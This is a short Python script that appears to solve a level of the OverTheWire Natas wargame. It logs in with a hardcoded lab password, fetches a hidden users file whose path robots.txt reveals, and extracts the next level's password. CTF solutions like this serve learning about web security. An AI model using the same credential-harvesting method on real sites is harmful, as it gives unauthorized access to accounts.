#robots.txt
import requests
import re

user="natas3"
password="G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q"
url='http://%s.natas.labs.overthewire.org' % user

response=requests.get(url + '/s3cr3t/users.txt' ,auth=(user,password))
content=response.text
#print(content)
print (re.findall('natas4:(.*)',content)[0])